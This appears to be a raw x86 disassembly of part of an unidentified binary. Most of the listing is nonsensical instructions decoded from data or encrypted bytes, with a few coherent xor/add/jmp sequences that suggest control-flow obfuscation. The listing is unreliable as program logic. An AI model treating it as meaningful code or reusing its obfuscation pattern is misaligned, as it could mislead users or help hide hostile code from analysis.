  4019ac:	sbb    eax,0x7a89f4bc
  4019b1:	dec    ebp
  4019b2:	and    al,0xa9
  4019b4:	aaa    
  4019b5:	loopne 0x40195d
  4019b7:	test   BYTE PTR [edi+0x42b3b8c9],dl
  4019bd:	and    ah,al
  4019bf:	mov    edi,0x8bba40fa
  4019c4:	dec    esp
  4019c5:	fcmove st,st(2)
  4019c7:	hlt    
  4019c8:	ret    
  4019c9:	mov    di,WORD PTR [edx+0x66]
  4019cd:	out    0x4a,eax
  4019cf:	or     ebp,DWORD PTR [edx-0x1]
  4019d2:	std    
  4019d3:	jmp    0x343b:0x904595a5
  4019da:	dec    edi
  4019db:	mov    esp,0x6049fd8
  4019e0:	dec    ebx
  4019e1:	jge    0x4019c4
  4019e3:	icebp  
  4019e4:	loopne 0x401a24
  4019e6:	test   eax,0xf6018960
  4019eb:	jnp    0x4019be
  4019ed:	pop    edx
  4019ee:	inc    esp
  4019ef:	inc    edx
  4019f0:	mov    eax,ds:0x28327146
  4019f5:	sbb    al,0xa3
  4019f7:	sbb    bh,bh
  4019f9:	jne    0x401a78
  4019fb:	ins    BYTE PTR es:[edi],dx
  4019fc:	das    
  4019fd:	jmp    0xadfb:0x37480299
  401a04:	push   0xffffffcd
  401a06:	ret    0xffd9
  401a09:	cmp    DWORD PTR [esi],edx
  401a0b:	out    0x95,eax
  401a0d:	and    DWORD PTR [ebp-0x2e],edi
  401a10:	aaa    
  401a11:	dec    edx
  401a12:	inc    eax
  401a13:	jne    0x4019e6
  401a15:	cmp    DWORD PTR [ebx],ebx
  401a17:	xchg   BYTE PTR [edi],al
  401a19:	repz mov ah,0x46
  401a1c:	xchg   BYTE PTR [ebx],ch
  401a1e:	dec    esi
  401a1f:	sub    eax,0x833f01c9
  401a24:	mov    ebx,0xb1ee6739
  401a29:	mov    edi,0x2fa31d39
  401a2e:	mov    ds:0x62e2789d,al
  401a33:	fwait
  401a34:	add    al,0x9e
  401a36:	js     0x401aa1
  401a38:	mov    cl,0x4c
  401a3a:	adc    bh,BYTE PTR [esi+0x73]
  401a3d:	inc    eax
  401a3e:	ins    BYTE PTR es:[edi],dx
  401a3f:	js     0x401a53
  401a41:	inc    ecx
  401a42:	cmp    al,0xa3
  401a44:	ss out 0xe,eax
  401a47:	imul   esp,edx,0x26
  401a4a:	sbb    cl,BYTE PTR [edx]
  401a4c:	dec    esi
  401a4d:	sbb    ebp,DWORD PTR [ebx+0x54]
  401a50:	pop    ecx
  401a51:	sahf   
  401a52:	dec    edx
  401a53:	push   esp
  401a54:	jmp    0xd0e6b5
  401a59:	adc    esi,ecx
  401a5b:	(bad)
  401a5e:	xor    DWORD PTR [ebx+eax*8+0x6],edi
  401a62:	in     eax,dx
  401a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a64:	push   ecx
  401a65:	(bad)  [edi-0x5648956]
  401a6b:	scas   al,BYTE PTR es:[edi]
  401a6c:	lods   eax,DWORD PTR ds:[esi]
  401a6d:	lods   al,BYTE PTR ds:[esi]
  401a6e:	jb     0x401a4e
  401a70:	xchg   BYTE PTR [edx],bh
  401a72:	sub    esi,DWORD PTR [eax-0x7691df76]
  401a78:	pop    ebp
  401a79:	mov    al,0xe9
  401a7b:	pushf  
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	pop    es
  401a8c:	dec    edx
  401a8d:	jb     0x401a23
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a33
  401a98:	pop    ebp
  401a99:	repz inc esi
  401a9b:	stc    
  401a9c:	xor    esp,DWORD PTR [edi+0x1eefe0ed]
  401aa2:	push   ss
  401aa3:	xchg   esp,eax
  401aa4:	mov    gs,edi
  401aa6:	pop    ss
  401aa7:	cmc    
  401aa8:	inc    edx
  401aa9:	bnd jno 0x401ad4
  401aac:	pop    edx
  401aad:	inc    eax
  401aae:	xchg   DWORD PTR [edi],edi
  401ab0:	or     eax,0xdc0daf04
  401ab5:	lahf   
  401ab6:	sbb    al,0xe5
  401ab8:	pop    edi
  401ab9:	loope  0x401af7
  401abb:	push   0xf9214a80
  401ac0:	jle    0x401a89
  401ac2:	inc    edx
  401ac3:	add    ebp,DWORD PTR [ebx]
  401ac5:	(bad)  
  401ac6:	jne    0x401aad
  401ac8:	mov    edi,0x404e1752
  401acd:	pushf  
  401ace:	retf   0x9467
  401ad1:	(bad)  
  401ad3:	rcl    DWORD PTR [ebp+edx*1+0x35803aa4],cl
  401ada:	push   0xbee58300
  401adf:	or     DWORD PTR ds:0xb5e3ba65,0xaba7bba0
  401ae9:	jbe    0x401b66
  401aeb:	scas   eax,DWORD PTR es:[edi]
  401aec:	loop   0x401ad2
  401aee:	mov    BYTE PTR [esi],bl
  401af0:	adc    eax,0xe0d05da6
  401af5:	gs cmp eax,0x97ea46e9
  401afb:	mov    esi,0x455f4a15
  401b00:	mov    al,0xbd
  401b02:	push   edx
  401b03:	push   ecx
  401b04:	cdq    
  401b05:	cmc    
  401b06:	sbb    ebx,edx
  401b08:	mov    ebp,0x1e8029d4
  401b0d:	ss loopne 0x401b48
  401b10:	arpl   WORD PTR [esi+esi*2],bp
  401b13:	cli    
  401b14:	mov    ebx,0x4104b39a
  401b19:	rcr    BYTE PTR [ebp-0x49],cl
  401b1c:	or     ah,BYTE PTR [esi-0x38780982]
  401b22:	pop    esp
  401b23:	jns    0x401b20
  401b25:	iret   
  401b26:	pop    edi
  401b27:	mov    edi,0x36ce190d
  401b2c:	int3   
  401b2d:	sbb    bh,BYTE PTR [edi+0x3a]
  401b30:	stos   DWORD PTR es:[edi],eax
  401b31:	lods   al,BYTE PTR ds:[esi]
  401b32:	arpl   WORD PTR [edi-0x6466d8ff],si
  401b38:	cdq    
  401b39:	stos   BYTE PTR es:[edi],al
  401b3a:	and    al,0x83
  401b3c:	push   ecx
  401b3d:	sbb    eax,0x69aacfa7
  401b42:	mov    bl,BYTE PTR [ecx]
  401b44:	dec    ecx
  401b45:	invd   
  401b47:	sti    
  401b48:	pop    ebp
  401b49:	rcr    DWORD PTR [ebp-0x7],0xa2
  401b4d:	js     0x401b1c
  401b4f:	mov    ds:0x8ce598bc,eax
  401b54:	add    DWORD PTR [eax],eax
  401b56:	inc    ebx
  401b57:	data16 fiadd WORD PTR [edi]
  401b5a:	xchg   ecx,eax
  401b5b:	mov    cl,0x48
  401b5d:	cmp    BYTE PTR [ebx+eax*8+0x35],ah
  401b61:	mov    edx,0xa98c4df2
  401b66:	ficom  WORD PTR [ebx]
  401b68:	jl     0x401af5
  401b6a:	or     DWORD PTR [ecx-0x48],ebp
  401b6d:	pop    esi
  401b6e:	inc    ecx
  401b6f:	lahf   
  401b70:	add    BYTE PTR [edi+0x382fdee3],al
  401b76:	shl    BYTE PTR ds:0x19df5b0d,0x72
  401b7d:	test   BYTE PTR [edx+ebp*1-0x63],ch
  401b81:	dec    edi
  401b82:	loopne 0x401b7d
  401b84:	das    
  401b85:	mov    bl,0x56
  401b87:	bnd jb 0x401b55
  401b8a:	and    esp,edi
  401b8c:	iret   
  401b8d:	cmp    eax,0x61934453
  401b92:	mov    ds,edi
  401b94:	je     0x401c09
  401b96:	mov    ebx,DWORD PTR ds:0x60801b5
  401b9c:	out    dx,eax
  401b9d:	cmp    ebp,DWORD PTR [ecx]
  401b9f:	ficomp DWORD PTR [ebx+0x3638b345]
  401ba5:	xchg   ecx,eax
  401ba6:	loop   0x401be3
  401ba8:	adc    cl,dh
  401baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bab:	lods   eax,DWORD PTR ds:[esi]
  401bac:	addr16 inc esp
  401bae:	mov    bh,0x88
  401bb0:	ret    
  401bb1:	push   cs
  401bb2:	inc    eax
  401bb3:	rcr    DWORD PTR [edx+eax*4-0x40438ce4],0xfa
  401bbb:	dec    ebx
  401bbc:	lea    edx,[ebx+0x68]
  401bbf:	add    edi,DWORD PTR [edx+0x415f76dd]
  401bc5:	aad    0xdc
  401bc7:	sar    BYTE PTR [edx+0x6e],1
  401bca:	and    eax,0x5a682930
  401bcf:	push   ecx
  401bd0:	jmp    0xa6a62c09
  401bd5:	inc    BYTE PTR [esi+0x13]
  401bd8:	mov    edx,0x2b7bad9b
  401bdd:	(bad)  
  401bdf:	ret    0x7e3a
  401be2:	ja     0x401c47
  401be4:	mov    ah,0xf4
  401be6:	push   edx
  401be7:	ss rcr edi,0x94
  401beb:	pop    ecx
  401bec:	test   al,0xe1
  401bee:	dec    esi
  401bef:	(bad)  
  401bf0:	mov    dh,0xe9
  401bf2:	ss xchg edx,eax
  401bf4:	pop    ebx
  401bf5:	outs   dx,BYTE PTR ds:[esi]
  401bf6:	dec    ebx
  401bf7:	iret   
  401bf8:	imul   ebp,DWORD PTR [ecx+0x341debca],0xffffffb6
  401bff:	mov    ecx,0xf1e7a382
  401c04:	sbb    BYTE PTR [eax+0x5b],bh
  401c07:	sar    DWORD PTR [ebp-0x9],1
  401c0a:	cmp    BYTE PTR [ecx],al
  401c0c:	xchg   edi,eax
  401c0d:	or     ecx,DWORD PTR [ebx-0x3d]
  401c10:	out    dx,eax
  401c11:	xchg   BYTE PTR [ecx],al
  401c13:	scas   eax,DWORD PTR es:[edi]
  401c14:	ins    DWORD PTR es:[edi],dx
  401c15:	fmul   st(7),st
  401c17:	aaa    
  401c18:	xchg   edi,eax
  401c19:	inc    ebp
  401c1a:	fisttp QWORD PTR [ebx+0x4d8bb045]
  401c20:	clc    
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	neg    BYTE PTR [esp+esi*4+0x7e798acf]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c3a
  401c4d:	jecxz  0x401bfb
  401c4f:	pop    ds
  401c50:	adc    DWORD PTR [esi],ecx
  401c52:	leave  
  401c53:	or     DWORD PTR [ecx+0x2b],ecx
  401c56:	sub    eax,0xd4e36c39
  401c5b:	jo     0x401c6a
  401c5d:	in     eax,dx
  401c5e:	jp     0x401c5d
  401c60:	pop    esp
  401c61:	adc    dl,BYTE PTR [eax-0x53]
  401c64:	shr    ecx,0x1
  401c67:	push   eax
  401c68:	sbb    bl,dh
  401c6a:	xor    edi,DWORD PTR [ecx+0x1d]
  401c6d:	push   0xffffffa0
  401c6f:	xchg   ebx,eax
  401c70:	enter  0x63de,0xf7
  401c74:	aad    0x48
  401c76:	or     al,0xce
  401c78:	xor    eax,0xe81ab98a
  401c7d:	sbb    eax,0x6bf52268
  401c82:	xchg   BYTE PTR [eax-0x34],bl
  401c85:	cld    
  401c86:	out    dx,al
  401c87:	dec    eax
  401c88:	js     0x401c6e
  401c8a:	call   0x4cb3610f
  401c8f:	rcl    dl,1
  401c91:	test   BYTE PTR [esp+ebx*8],dl
  401c94:	dec    edi
  401c95:	xchg   edx,eax
  401c96:	ror    BYTE PTR [edx+0x5be597ce],0x78
  401c9d:	mov    eax,0xf2ac79d
  401ca2:	repz pop ebx
  401ca4:	ins    BYTE PTR es:[edi],dx
  401ca5:	sbb    eax,0xed49c9ec
  401caa:	jns    0x401cdc
  401cac:	test   BYTE PTR [ecx],dh
  401cae:	adc    DWORD PTR [edi+0x7be6a492],eax
  401cb4:	lods   eax,DWORD PTR ds:[esi]
  401cb5:	cli    
  401cb6:	sar    DWORD PTR [ebp-0x37],cl
  401cb9:	mov    esi,DWORD PTR [esi+ebp*2-0x69]
  401cbd:	cmp    BYTE PTR [edi-0x4e96d43f],bh
  401cc3:	cdq    
  401cc4:	cs push 0xffffff9f
  401cc7:	sub    bl,BYTE PTR [ecx]
  401cc9:	(bad)  
  401cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ccb:	mov    ebx,0x6a04fe37
  401cd0:	mov    dh,0xf0
  401cd2:	adc    eax,0xca1a7e36
  401cd7:	leave  
  401cd8:	and    ah,BYTE PTR [edx-0x60]
  401cdb:	adc    al,0xc4
  401cdd:	sub    ebp,DWORD PTR [edx-0x19a09e66]
  401ce3:	js     0x401ce2
  401ce5:	ret    
  401ce6:	jg     0x401d3f
  401ce8:	xchg   DWORD PTR [edi+0x1f],esi
  401ceb:	call   0x5c80c26
  401cf0:	arpl   WORD PTR [edx-0x3db8fe2f],sp
  401cf6:	in     al,dx
  401cf7:	pusha  
  401cf8:	jns    0x401c9f
  401cfa:	mov    ch,0x6e
  401cfc:	sub    dh,BYTE PTR [edi]
  401cfe:	stos   DWORD PTR es:[edi],eax
  401cff:	shr    DWORD PTR [ecx],cl
  401d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d02:	mov    dl,0xde
  401d04:	(bad)  [ebx]
  401d06:	dec    edi
  401d07:	xor    dh,BYTE PTR [esp+edi*2-0x366b028e]
  401d0e:	rcr    esp,cl
  401d10:	outs   dx,BYTE PTR ds:[esi]
  401d11:	fdiv   st(7),st
  401d13:	push   eax
  401d14:	mov    ah,0xec
  401d16:	std    
  401d17:	inc    esi
  401d18:	push   esp
  401d19:	mov    ?,WORD PTR ds:0x43c670fd
  401d1f:	into   
  401d20:	push   eax
  401d21:	xchg   esi,eax
  401d22:	jle    0x401d96
  401d24:	pusha  
  401d25:	cmovge esi,DWORD PTR [edx]
  401d28:	lea    ebp,[esi-0x1f]
  401d2b:	loop   0x401d21
  401d2d:	inc    edi
  401d2e:	sub    DWORD PTR [ebp+0x5dc76c57],edx
  401d34:	loope  0x401cba
  401d36:	aas    
  401d37:	xchg   DWORD PTR [ecx-0x48],edx
  401d3a:	dec    ebx
  401d3b:	lods   eax,DWORD PTR ds:[esi]
  401d3c:	fsubr  QWORD PTR ds:0xcf2539c5
  401d42:	sar    WORD PTR [ebp+edi*8+0xb],0x93
  401d48:	and    al,BYTE PTR [eax+0x68e0db72]
  401d4e:	cwde   
  401d4f:	mov    ebp,0x137d9690
  401d54:	iret   
  401d55:	retf   
  401d56:	and    eax,0x4f67d37c
  401d5b:	or     eax,0x56cb0ac8
  401d60:	cmc    
  401d61:	adc    eax,0x7bace607
  401d66:	loop   0x401d5b
  401d68:	test   esp,ecx
  401d6a:	or     eax,0xfa1f455a
  401d6f:	lods   al,BYTE PTR ds:[esi]
  401d70:	lds    ecx,FWORD PTR [eax+0x7552f808]
  401d76:	add    al,0xb6
  401d78:	dec    edx
  401d79:	hlt    
  401d7a:	je     0x401d08
  401d7c:	repz push edi
  401d7e:	push   eax
  401d7f:	ins    DWORD PTR es:[edi],dx
  401d80:	mov    gs,WORD PTR [eax]
  401d82:	rcl    BYTE PTR cs:[ebx+0x2d1e1f07],cl
  401d89:	inc    ebp
  401d8a:	dec    esi
  401d8b:	mov    dh,0x1d
  401d8d:	fdiv   QWORD PTR [ecx-0x5e4718b8]
  401d93:	mov    WORD PTR [ebx+ecx*8+0xe],gs
  401d97:	adc    esp,ecx
  401d99:	xchg   ebx,eax
  401d9a:	inc    si
  401d9c:	pop    esp
  401d9d:	sahf   
  401d9e:	aam    0x57
  401da0:	jae    0x401e1d
  401da2:	push   ds
  401da3:	jg     0x401d3b
  401da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401da6:	or     BYTE PTR [ebx+0x4a],cl
  401da9:	xor    edi,edi
  401dab:	push   ds
  401dac:	pop    esp
  401dad:	or     dh,BYTE PTR [edi+0x1f]
  401db0:	aas    
  401db1:	sub    eax,0x31174560
  401db6:	(bad)  
  401db7:	fadd   st(1),st
  401db9:	jle    0x401d69
  401dbb:	mov    ebp,0x773eb212
  401dc0:	push   cs
  401dc1:	mov    dl,0x80
  401dc3:	jl     0x401e0f
  401dc5:	(bad)  
  401dc6:	fst    DWORD PTR ds:0x16819a7e
  401dcc:	or     BYTE PTR [edi-0x38fca189],al
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x59e3a6c8],ebp
  401e0d:	jo     0x401e25
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e37
  401e17:	pop    es
  401e18:	cmp    al,0xbd
  401e1a:	sar    BYTE PTR [edx-0x44],0x2
  401e1e:	imul   DWORD PTR [eax-0x23afa0b9]
  401e24:	rol    BYTE PTR ds:0x71049f1d,cl
  401e2a:	cmp    al,0x26
  401e2c:	pop    edi
  401e2d:	mov    ch,0x55
  401e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e30:	es push eax
  401e32:	mov    bh,0x2
  401e34:	(bad)  
  401e35:	push   ecx
  401e36:	repz sub ch,ch
  401e39:	retf   0x4ad2
  401e3c:	scas   al,BYTE PTR es:[edi]
  401e3d:	add    DWORD PTR [ecx+0x49],0x62d8b9b7
  401e44:	shr    BYTE PTR [ebp-0x4f],1
  401e47:	mov    dh,0x18
  401e49:	or     dl,bh
  401e4b:	mov    al,ds:0x433ef903
  401e50:	fdivr  st,st(6)
  401e52:	add    al,0xe4
  401e54:	nop
  401e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e56:	lods   eax,DWORD PTR ds:[esi]
  401e57:	lock lahf 
  401e59:	je     0x401ed6
  401e5b:	enter  0x3f92,0x53
  401e5f:	inc    ecx
  401e60:	jp     0x401e0b
  401e62:	aad    0x32
  401e64:	cmp    BYTE PTR [ebx+0x15],al
  401e67:	xchg   DWORD PTR [ebp-0xb],ebx
  401e6a:	(bad)  
  401e6b:	pop    edx
  401e6c:	or     DWORD PTR [ebx+ebp*2],ebx
  401e6f:	push   edx
  401e70:	xor    al,0xea
  401e72:	aaa    
  401e73:	iret   
  401e74:	adc    DWORD PTR [edx-0x77],esi
  401e77:	sub    ebx,ebx
  401e79:	or     al,0xe
  401e7b:	ss sahf 
  401e7d:	jo     0x401efb
  401e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e80:	in     eax,dx
  401e81:	push   ebx
  401e82:	cmp    al,0x7
  401e84:	xor    DWORD PTR [edi-0x36],esp
  401e87:	pop    ebp
  401e88:	stos   DWORD PTR es:[edi],eax
  401e89:	out    0xa7,eax
  401e8b:	adc    cl,BYTE PTR [ebx-0x3d639bfb]
  401e91:	div    DWORD PTR [ebp-0x7938cc90]
  401e97:	mov    DWORD PTR [ecx],ebp
  401e99:	xor    eax,0x5b8522b5
  401e9e:	sbb    BYTE PTR [esi+eax*2],bh
  401ea1:	mov    esp,0x7f23982
  401ea6:	pop    ebp
  401ea7:	cmc    
  401ea8:	xchg   edx,eax
  401ea9:	jae    0x401e34
  401eab:	je     0x401e8b
  401ead:	mov    DWORD PTR [eax+eax*4+0x7573e3b6],eax
  401eb4:	push   ss
  401eb5:	sub    eax,0x86d943d0
  401eba:	mov    DWORD PTR ds:0x1cbeeb36,edi
  401ec0:	test   BYTE PTR [ebx-0x1273df51],dh
  401ec6:	fwait
  401ec7:	pop    ebx
  401ec8:	or     al,0x59
  401eca:	lds    ebx,FWORD PTR [eax]
  401ecc:	leave  
  401ecd:	daa    
  401ece:	sbb    ah,BYTE PTR cs:[esp+esi*2-0x14673e74]
  401ed6:	fldenv [esi]
  401ed8:	repnz sbb DWORD PTR [esi-0x21dd013d],esi
  401edf:	imul   esp,ecx,0x63631f9
  401ee5:	mov    dl,0x76
  401ee7:	xchg   ebx,eax
  401ee8:	shr    DWORD PTR [edi+0x75cc9a57],cl
  401eee:	les    esp,FWORD PTR [ecx]
  401ef0:	add    eax,DWORD PTR [edx]
  401ef2:	cmp    eax,DWORD PTR [eax+0x4526b795]
  401ef8:	imul   esi,DWORD PTR [ecx-0x79781068],0xeee32451
  401f02:	push   0xa5890c9c
  401f07:	xchg   ebp,eax
  401f08:	jno    0x401e95
  401f0a:	pop    esi
  401f0b:	rol    DWORD PTR [ebp+0x37],cl
  401f0e:	or     esp,DWORD PTR [ebp+0x34]
  401f11:	lds    esi,FWORD PTR [edx-0x4cabf85]
  401f17:	test   eax,0x52202baf
  401f1c:	lock imul edi,edx,0x5be49cef
  401f23:	add    eax,0x50bab38b
  401f28:	and    ah,ch
  401f2a:	mov    bl,0xd8
  401f2c:	dec    ebp
  401f2d:	xchg   edx,eax
  401f2e:	cli    
  401f2f:	jno    0x401f56
  401f31:	sub    DWORD PTR [esi-0x53382d69],edx
  401f37:	lods   eax,DWORD PTR ds:[esi]
  401f38:	or     al,0x49
  401f3a:	xchg   si,ax
  401f3c:	iret   
  401f3d:	scas   eax,DWORD PTR es:[edi]
  401f3e:	sub    bh,BYTE PTR [edx-0x25]
  401f41:	outs   dx,BYTE PTR ds:[esi]
  401f42:	sub    DWORD PTR [ebx-0x2e6b4d2],0x71fc3f6
  401f4c:	jl     0x401ef7
  401f4e:	rol    DWORD PTR [edi+0x6da0041],1
  401f54:	inc    esi
  401f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f56:	sbb    al,0x51
  401f58:	sbb    BYTE PTR [ebx+0x2d354d7d],ah
  401f5e:	xchg   ecx,eax
  401f5f:	mov    esi,DWORD PTR [edx+0x78]
  401f62:	and    cl,ah
  401f64:	sbb    DWORD PTR [eax-0x47808fe1],0x4bb79eb1
  401f6e:	mov    dl,0x9d
  401f70:	in     al,dx
  401f71:	scas   al,BYTE PTR es:[edi]
  401f72:	bound  esi,QWORD PTR [ecx+ebx*1]
  401f75:	cmp    dl,ah
  401f77:	imul   ebp,DWORD PTR [esi],0xcadd0ac2
  401f7d:	adc    al,0x9
  401f7f:	in     al,0x45
  401f81:	cmp    ah,BYTE PTR [edx]
  401f83:	inc    ebp
  401f84:	ins    BYTE PTR es:[edi],dx
  401f85:	fbstp  TBYTE PTR [esi+0x3a]
  401f88:	mov    eax,0x8af8dca5
  401f8d:	sbb    dh,BYTE PTR [esp+eax*4]
  401f90:	stos   BYTE PTR es:[edi],al
  401f91:	or     DWORD PTR [ebp+edx*4-0x3b],esp
  401f95:	cmp    dh,BYTE PTR [edi-0x24]
  401f98:	jge    0x401f28
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x21fd7f22
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f6e
  401fcc:	icebp  
  401fcd:	and    edi,DWORD PTR [ebx+0x2996efd1]
  401fd3:	add    bh,bl
  401fd5:	push   ebx
  401fd6:	mov    ds:0x2415ac91,eax
  401fdb:	test   esp,ecx
  401fdd:	jg     0x401fd5
  401fdf:	mov    ecx,0xd6762bed
  401fe4:	mov    al,0x9d
  401fe6:	sti    
  401fe7:	mov    esi,0x84a5841c
  401fec:	mov    esi,0x69486f7
  401ff1:	sbb    al,0x18
  401ff3:	ss and al,0xfa
  401ff6:	mov    edx,0x32e57fcc
  401ffb:	jge    0x402049
  401ffd:	out    dx,al
  401ffe:	imul   edx,DWORD PTR [ebp+ebp*2+0x20],0xa4428bdf
  402006:	pop    ebp
  402007:	shr    BYTE PTR [ebp-0x2c8da8a5],cl
  40200d:	(bad)  
  40200e:	iret   
  40200f:	(bad)  
  402010:	cmp    ah,BYTE PTR [esi+0x64f28a4f]
  402016:	cs pop ss
  402018:	inc    edx
  402019:	shl    BYTE PTR [esi+0xc],cl
  40201c:	jle    0x401fb3
  40201e:	neg    DWORD PTR [edx-0x3477b010]
  402024:	fs mov ecx,0xe4ebc600
  40202a:	dec    ecx
  40202b:	dec    edi
  40202c:	retf   
  40202d:	cmp    al,0x2e
  40202f:	pop    ebx
  402030:	stc    
  402031:	mov    al,ds:0x2bd87ddf
  402036:	add    al,0x2d
  402038:	out    0xca,al
  40203a:	(bad)  
  40203b:	jge    0x401ffc
  40203d:	add    eax,0x7d817d23
  402042:	imul   ebx,DWORD PTR [edi+0x5d],0xffffffe7
  402046:	or     cl,dl
  402048:	push   0x27
  40204a:	mov    ebx,0x498d09ab
  40204f:	clc    
  402050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402051:	pop    eax
  402052:	or     DWORD PTR [esi+0x7f299e9b],ebp
  402058:	sub    BYTE PTR [edx],0xc2
  40205b:	pop    ebp
  40205c:	jae    0x4020c6
  40205e:	push   es
  40205f:	scas   al,BYTE PTR es:[edi]
  402060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402061:	out    0x3,al
  402063:	push   cs
  402064:	xlat   BYTE PTR ds:[ebx]
  402065:	pusha  
  402066:	mov    ebp,0x9af0cb12
  40206b:	pop    ecx
  40206c:	jmp    0x4e201f58
  402071:	push   ecx
  402072:	jbe    0x402063
  402074:	(bad)  
  402075:	call   0x494908ee
  40207a:	jge    0x4020a3
  40207c:	scas   eax,DWORD PTR es:[edi]
  40207d:	cs scas al,BYTE PTR es:[edi]
  40207f:	xor    eax,0xccbe7a16
  402084:	popf   
  402085:	xchg   DWORD PTR [edx-0x55b8cdcb],esp
  40208b:	mov    ebp,0xfa201d68
  402090:	inc    ecx
  402091:	mov    bl,0x57
  402093:	mov    eax,ds:0x85dfc311
  402098:	or     DWORD PTR [edx],0x441f7de1
  40209e:	lods   al,BYTE PTR ds:[esi]
  40209f:	rcl    DWORD PTR [eax+0x51],0x45
  4020a3:	sahf   
  4020a4:	xlat   BYTE PTR ds:[ebx]
  4020a5:	mov    edx,0x8447766e
  4020aa:	pop    ecx
  4020ab:	cwde   
  4020ac:	push   ecx
  4020ad:	ja     0x4020f1
  4020af:	inc    eax
  4020b0:	(bad)
  4020b3:	js     0x402129
  4020b5:	nop
  4020b6:	pop    es
  4020b7:	pop    esi
  4020b8:	int    0x54
  4020ba:	fldcw  WORD PTR [ebp+0x52dcd408]
  4020c0:	cdq    
  4020c1:	fs call 0x145a5698
  4020c7:	xor    edi,DWORD PTR [eax-0x32cafbb0]
  4020cd:	pusha  
  4020ce:	or     dl,bl
  4020d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d1:	xchg   edi,eax
  4020d2:	ret    0x4c74
  4020d5:	jns    0x402057
  4020d7:	pop    es
  4020d8:	loop   0x4020f9
  4020da:	pop    es
  4020db:	sub    BYTE PTR [eax+edx*8-0x2675ec0a],dl
  4020e2:	push   ds
  4020e3:	(bad)  
  4020e4:	es shr ebx,0x8
  4020e8:	or     BYTE PTR [ecx+eax*8-0x8],ah
  4020ec:	adc    al,0x1c
  4020ee:	daa    
  4020ef:	dec    esp
  4020f0:	rcl    edi,1
  4020f2:	mov    es,WORD PTR gs:[ecx-0x59]
  4020f6:	cdq    
  4020f7:	loope  0x40213b
  4020f9:	nop
  4020fa:	bound  ebx,QWORD PTR [edx-0x1a]
  4020fd:	inc    edx
  4020fe:	fild   DWORD PTR [ebx+edi*1]
  402101:	jno    0x402161
  402103:	mov    al,ds:0x8c85c6e7
  402108:	dec    ebp
  402109:	fcom   DWORD PTR [edi+0xcbbd0c4]
  40210f:	sbb    eax,0xeb75cb39
  402114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402115:	add    bl,BYTE PTR ds:0x5a605cc9
  40211b:	jmp    0x402134
  40211d:	adc    ah,BYTE PTR [ecx+0xab8e816]
  402123:	aam    0xc8
  402125:	cmp    eax,edx
  402127:	out    dx,al
  402128:	jns    0x402166
  40212a:	or     eax,0x1c2b78e4
  40212f:	push   0x58
  402131:	cwde   
  402132:	pop    ss
  402133:	sub    eax,0x28e6f069
  402139:	fisub  DWORD PTR [eax+0x67]
  40213c:	sub    bl,cl
  40213e:	push   es
  40213f:	out    0x13,eax
  402141:	dec    edi
  402142:	loop   0x402145
  402144:	(bad)  
  402145:	push   edx
  402146:	pop    es
  402147:	fidivr WORD PTR [edx]
  402149:	imul   edx,esi,0xf9f8502
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
